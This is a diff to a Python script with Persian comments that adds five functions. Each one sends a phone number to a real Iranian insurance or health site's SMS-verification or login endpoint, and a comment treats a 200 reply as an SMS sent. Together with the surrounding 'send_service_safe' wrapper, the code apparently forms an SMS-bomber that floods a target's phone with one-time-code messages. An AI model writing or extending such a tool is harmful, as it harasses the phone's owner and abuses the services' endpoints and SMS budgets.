@@ -70,7 +70,159 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+def bimehland(phone):
+    # اصلاح شماره
+    if phone.startswith("+98"): phone = "0" + phone[3:]
+    elif phone.startswith("98"): phone = "0" + phone[2:]
+    
+    url = "https://bimehland.com/MasterApi/VerifyNumber"
+    data = {"mobile": phone, "nCode": None, "sso": ""}
+    headers = {
+        "Accept": "application/json",
+        "Content-Type": "application/json"
+    }
+    
+    try:
+        r = requests.post(url, json=data, headers=headers, timeout=10)
+        print("Status:", r.status_code)
+        print("Response:", r.text[:200])  # فقط 200 کاراکتر اول برای خلاصگی
+        return r.ok
+    except Exception as e:
+        print("Error:", e)
+        return False
+        
 
+def ebimename(phone: str):
+    try:
+        # شماره را به فرمت 09... تبدیل می‌کنیم
+        if phone.startswith("+98"):
+            phone = "0" + phone[3:]
+        elif phone.startswith("98"):
+            phone = "0" + phone[2:]
+
+        url = "https://ebimename.com/MasterApi/VerifyNumber"
+        data = {
+            "mobile": phone,
+            "nCode": None,
+            "sso": ""
+        }
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        }
+
+        r = requests.post(url, json=data, headers=headers, timeout=10)
+
+        print("Status:", r.status_code)
+        ctype = r.headers.get("Content-Type", "")
+        print("Content-Type:", ctype)
+
+        if "application/json" in ctype.lower():
+            print("Response JSON:", r.json())
+        else:
+            print("Response TEXT:", r.text[:300], "..." if len(r.text) > 300 else "")
+
+        return r.status_code in [200, 201]
+
+    except Exception as e:
+        print("Error:", e)
+        return False
+        
+        
+
+def bimeparsian(phone: str):
+    try:
+        # اصلاح شماره به فرمت 09...
+        if phone.startswith("+98"):
+            phone = "0" + phone[3:]
+        elif phone.startswith("98"):
+            phone = "0" + phone[2:]
+
+        url = "https://bimeparsian.com/MasterApi/VerifyNumber"
+        data = {
+            "mobile": phone,
+            "nCode": None,
+            "sso": ""
+        }
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        }
+
+        r = requests.post(url, json=data, headers=headers, timeout=10)
+
+        print("Status:", r.status_code)
+        if r.text.strip():
+            print("Response:", r.text)
+        else:
+            print("Response: [empty]")
+
+        # اگر 200 یا 201 بیاد یعنی درخواست SMS ثبت شده
+        return r.status_code in [200, 201]
+
+    except Exception as e:
+        print("Error:", e)
+        return False
+
+
+def didar24(phone):
+    try:
+        session = requests.Session()
+        
+        # شماره رو به فرمت 09123456780 تبدیل می‌کنیم
+        formatted_phone = phone
+        if phone.startswith("+98"):
+            formatted_phone = "0" + phone[3:]
+        elif phone.startswith("98"):
+            formatted_phone = "0" + phone[2:]
+        
+        url = "https://didar24.com/api/AccessManagement/OAuth/mobile"
+        data = {"mobile": formatted_phone}
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+        }
+        
+        response = session.post(url, json=data, headers=headers, timeout=10)
+        
+        print(f"Status: {response.status_code}")
+        print(f"Response: {response.text}")
+        
+        return response.status_code == 200
+    
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
+
+
+def hami_bime(phone):
+    try:
+        session = requests.Session()
+        
+        # شماره را به فرمت 09123456780 تبدیل می‌کنیم
+        formatted_phone = phone
+        if phone.startswith("+98"):
+            formatted_phone = "0" + phone[3:]
+        elif phone.startswith("98"):
+            formatted_phone = "0" + phone[2:]
+        
+        url = "https://hami.bimehasia.ir/api/auth/login-authorization-sms-code"
+        data = {"cellphone": formatted_phone}
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+        }
+        
+        response = session.post(url, json=data, headers=headers, timeout=10)
+        
+        print(f"Status: {response.status_code}")
+        print(f"Response: {response.text}")
+        
+        return response.status_code == 200
+    
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
 
 def bimesho(phone):
     try:
